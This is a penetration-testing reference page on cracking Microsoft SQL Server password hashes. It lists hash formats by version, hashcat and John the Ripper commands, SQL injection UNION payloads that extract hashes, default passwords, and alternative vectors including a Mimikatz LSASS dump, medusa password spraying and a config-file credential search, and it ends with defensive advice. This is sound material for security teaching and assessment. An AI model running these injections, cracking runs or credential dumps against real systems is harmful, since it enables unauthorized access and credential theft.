---
title: Password Cracking
description: Techniques for cracking Microsoft SQL Server password hashes
category: Authentication
order: 18
tags: ["password cracking", "hash", "authentication"]
lastUpdated: 2026-10-08
---

After extracting password hashes from Microsoft SQL Server, the next step in a penetration test is often to attempt cracking these hashes to recover plaintext passwords. This knowledge can be valuable for lateral movement, privilege escalation, or accessing other systems where credentials might be reused.

## SQL Server Hash Types

Before attempting to crack SQL Server password hashes, it's important to identify the hash type based on its format:

| SQL Server Version      | Hash Format                                   | Length   | Hashcat mode |
| ----------------------- | --------------------------------------------- | -------- | ------------ |
| SQL Server 2000         | 0x0100\[salt\]\[SHA-1\]\[SHA-1 of uppercase\] | 46 bytes | 131          |
| SQL Server 2005-2008 R2 | 0x0100\[salt\]\[SHA-1\]                       | 26 bytes | 132          |
| SQL Server 2012-2022    | 0x0200\[salt\]\[SHA-512\]                     | 70 bytes | 1731         |
| SQL Server 2025         | 0x0300, PBKDF2-SHA-512 (100,000 iterations)   | 70 bytes | 36601        |

The salt is 4 bytes. See [Password Hashing](/mssql/password-hashing) for the layout. Example of a SQL Server 2005 hash (password `password`): `0x01004086CEB6E0BC04FE5027A51DF29E1CF0B74DD3C33214D9DB`.

## Cracking Tools

Several tools can be used to crack SQL Server password hashes:

| Tool            | Description                       | Strengths                                                       |
| --------------- | --------------------------------- | --------------------------------------------------------------- |
| Hashcat         | GPU-accelerated password cracker  | Fast, supports many attack modes, highly customizable           |
| John the Ripper | CPU-based password cracker        | Well-established, user-friendly, supports many hash types       |
| Metasploit      | Framework with SQL Server modules | `mssql_hashdump` extracts hashes, `mssql_login` tests passwords |
| Hydra/Medusa    | Online password crackers          | For direct SQL Server authentication attempts                   |

## Hashcat Commands for SQL Server Hashes

```bash
# SQL Server 2000 (hash mode 131)
hashcat -m 131 -a 0 mssql_hashes.txt wordlist.txt

# SQL Server 2005 to 2008 R2 (hash mode 132)
hashcat -m 132 -a 0 mssql_hashes.txt wordlist.txt

# SQL Server 2012 to 2022 (hash mode 1731)
hashcat -m 1731 -a 0 mssql_hashes.txt wordlist.txt

# SQL Server 2025, or 2022 CU12+ with trace flag 4671 (hash mode 36601)
hashcat -m 36601 -a 0 mssql_hashes.txt wordlist.txt
```

Mode 131 recovers the uppercased password from the second half of a SQL Server 2000 hash; try case variations of the result against mode 132 or the full hash. The iterated `0x0300` format is about 100,000 times slower to crack. Mode 36601 is in the hashcat source but not in release 7.1.2, so build hashcat from source; John the Ripper has no format for it.

## John the Ripper Commands

```bash
# SQL Server 2000
john --format=mssql mssql_hashes.txt

# SQL Server 2005 to 2008 R2
john --format=mssql05 mssql_hashes.txt

# SQL Server 2012 to 2022
john --format=mssql12 mssql_hashes.txt
```

## Attack Strategies

### Dictionary Attack

Using a wordlist of common passwords:

```bash
hashcat -m 132 -a 0 mssql_hashes.txt rockyou.txt
```

### Rule-based Attack

Applying transformations to dictionary words:

```bash
hashcat -m 132 -a 0 mssql_hashes.txt rockyou.txt -r rules/best64.rule
```

### Brute Force Attack

Trying all possible combinations of characters:

```bash
# Brute force up to 8 characters
hashcat -m 132 -a 3 mssql_hashes.txt ?a?a?a?a?a?a?a?a
```

### Mask Attack

Targeted brute force using patterns:

```bash
# Target 8-char passwords with specific pattern
hashcat -m 132 -a 3 mssql_hashes.txt ?u?l?l?l?l?l?d?d
```

### Hybrid Attack

Combining dictionary words with patterns:

```bash
# Words from dictionary with 4 digits appended
hashcat -m 132 -a 6 mssql_hashes.txt rockyou.txt ?d?d?d?d
```

## Hash Extraction Techniques

Before cracking, you need to extract hashes. With SQL injection access:

Needs a login with `CONTROL SERVER` (sysadmin) or, on SQL Server 2022+, `VIEW ANY CRYPTOGRAPHICALLY SECURED DEFINITION`; otherwise `password_hash` is `NULL`. String context, original query returns 2 string columns:

```sql
-- Direct extraction (style 1 returns the hash as a 0x... hex string)
' UNION SELECT name, CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins--

-- Retrieving SA password hash
' UNION SELECT name, CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins WHERE name = 'sa'--
```

Casting `password_hash` to `varchar` instead of converting it with style 1 returns the raw bytes as characters, which is unusable.

## Format Conversion for Cracking Tools

Hashcat and John take the hash exactly as `CONVERT(varchar(max), password_hash, 1)` prints it, `0x` prefix included, with no separator between salt and hash:

```text
# Hashcat input (one hash per line)
0x01004086CEB6E0BC04FE5027A51DF29E1CF0B74DD3C33214D9DB

# With the login name: John reads "login:hash", hashcat needs --username
sa:0x01004086CEB6E0BC04FE5027A51DF29E1CF0B74DD3C33214D9DB
```

## Common Default and Weak Passwords

Many SQL Server installations use default or weak passwords:

| Username       | Common Passwords                                                    |
| -------------- | ------------------------------------------------------------------- |
| sa             | (empty), sa, password, Password123, sqlserver, sql, p@ssw0rd, admin |
| admin          | admin, password, Password123, Admin123                              |
| sqladmin       | sqladmin, password, Password123                                     |
| [company name] | [company name], [company name]123, Welcome123                       |

## Password Policy Considerations

SQL Server's password policies affect cracking success:

1. When `CHECK_POLICY = ON`, passwords must meet Windows complexity requirements:
   - At least 8 characters
   - Characters from three of: uppercase, lowercase, digits, symbols
   - Not containing the login name

2. Without policy enforcement (`CHECK_POLICY = OFF`), simpler passwords might be used

3. SQL Server 2025 hashes with 100,000 PBKDF2 iterations, which makes offline cracking orders of magnitude slower

## Optimizing Cracking Performance

### Hashcat Optimizations

```bash
# Use multiple GPUs
hashcat -m 132 -a 0 -d 1,2,3 mssql_hashes.txt wordlist.txt

# Optimize workload
hashcat -m 132 -a 0 -w 3 mssql_hashes.txt wordlist.txt

# Use custom character sets
hashcat -m 132 -a 3 mssql_hashes.txt -1 ?l?u?d ?1?1?1?1?1?1?1?1
```

### John the Ripper Optimizations

```bash
# Use multiple cores
john --format=mssql05 --fork=4 mssql_hashes.txt

# Use session for resume capability
john --format=mssql05 --session=sqlserver mssql_hashes.txt
```

## Real-World Attack Workflow

1. **Extract hashes**:

   ```sql
   -- One "login:hash" line per SQL login, saved as sql_hashes.txt
   SELECT name + ':' + CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins WHERE password_hash IS NOT NULL;
   ```

2. **Pick the mode from the header**: `0x0300` is mode 36601, `0x0200` is mode 1731, `0x0100` with 26 bytes is mode 132.

3. **Run cracking tools**:

   ```bash
   hashcat -m 1731 -a 0 --username sql_hashes.txt rockyou.txt -r rules/best64.rule
   ```

4. **Check results**:

   ```bash
   hashcat -m 1731 --username sql_hashes.txt --show
   ```

## Special SQL Server Password Considerations

1. **Case Sensitivity**: SQL Server login passwords are case-sensitive; only the SQL Server 2000 format also stores a case-insensitive hash

2. **Unicode Support**: SQL Server supports Unicode passwords, significantly increasing the password space

3. **Reversible Secrets**: Linked server and credential passwords are not hashed but encrypted with the service master key; a sysadmin on the host can decrypt them through the dedicated admin connection

4. **Salting**: every format, including SQL Server 2000, uses a per-password salt, making rainbow table attacks ineffective

5. **Service Account Reuse**: Often, SQL Server service accounts have their passwords reused across multiple services

## Alternative Attack Vectors

When hash cracking is difficult, consider:

1. **Password Spraying**: Attempting common passwords against multiple accounts

   ```bash
   medusa -h target -u sa -P common_passwords.txt -M mssql
   ```

2. **Keylogging/Memory Dumping**: On compromised servers, extract credentials from memory

   ```bash
   # Using Mimikatz to extract from LSASS memory
   mimikatz "sekurlsa::logonpasswords" exit
   ```

3. **Credential Theft from Configuration Files**: Many applications store SQL Server credentials in config files

   ```bash
   # Example PowerShell search for connection strings
   Get-ChildItem -Path C:\ -Recurse -Include *.config -ErrorAction SilentlyContinue | Select-String -Pattern "connectionString" -SimpleMatch
   ```

## Security Recommendations

To protect against password cracking:

1. Use Windows Authentication instead of SQL Authentication when possible
2. Enforce strong password policies with `CHECK_POLICY = ON`
3. Use complex, unique passwords for SQL accounts
4. Implement Multi-Factor Authentication (MFA) for SQL Server access
5. Regularly rotate SQL Server service account passwords
6. Monitor for unauthorized access attempts with SQL Server Audit
7. Consider using Always Encrypted for sensitive data
